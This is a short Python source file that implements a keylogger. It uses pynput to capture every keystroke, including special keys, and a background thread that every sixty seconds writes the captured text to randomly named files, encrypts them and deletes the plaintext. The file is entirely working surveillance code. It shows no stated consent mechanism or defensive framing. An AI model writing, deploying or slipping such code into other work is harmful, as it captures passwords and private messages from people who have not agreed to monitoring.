from pynput import keyboard
import os
import time
import uuid
import threading
from encryptor import encrypt_file

log_buffer = [] # buffer for the keystrokes
os.makedirs("logs", exist_ok=True)

def key_logger():
    def on_press(key):
        try:
            # try getting printable character
            log_buffer.append(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                log_buffer.append(" ")
            elif key == keyboard.Key.enter:
                log_buffer.append("\n")
            elif key == keyboard.Key.tab:
                log_buffer.append("\t")
            else:
                # fallback for other keys like ctrl, esc, etc.
                log_buffer.append(f"[{key.name}]")
                
    threading.Thread(target=auto_flusher, daemon=True).start()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def flush_buffer():
    if not log_buffer:
        return

    content = "".join(log_buffer)
    unique_id = uuid.uuid4().hex
    filename = f"logs/{unique_id}.txt"

    with open(filename, "w") as f:
        f.write(content)

    encrypt_file(filename, f"{filename}.enc")
    os.remove(filename)
    log_buffer.clear()

def auto_flusher():
    while True:
        time.sleep(60)
        flush_buffer()
